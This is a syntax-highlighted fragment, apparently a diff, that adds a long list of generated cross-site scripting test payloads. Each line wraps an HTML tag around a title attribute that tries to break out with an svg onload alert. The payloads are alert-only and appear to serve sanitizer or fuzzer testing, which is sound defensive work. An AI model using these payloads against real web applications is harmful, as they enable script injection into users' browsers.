+<span class="hljs-operator">&lt;</span>meter<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>nav<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>nobr<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>noframes<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>noscript<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>object<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>ol<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>optgroup<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>option<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>output<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>param<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>picture<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>plaintext<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>pre<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>progress<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>q<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>rp<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>rt<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>rtc<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>ruby<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>s<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>samp<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>script<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>section<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span><span class="hljs-built_in">select</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>shadow<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>slot<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>small<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>source<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>spacer<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>span<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>strike<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>strong<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>style<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span><span class="hljs-built_in">sub</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>summary<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>sup<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>table<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>tbody<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>td<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>template<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>textarea<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>tfoot<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>th<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>thead<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>time<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>title<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>tr<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>track<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>tt<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>u<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>ul<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>var<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>video<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>wbr<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
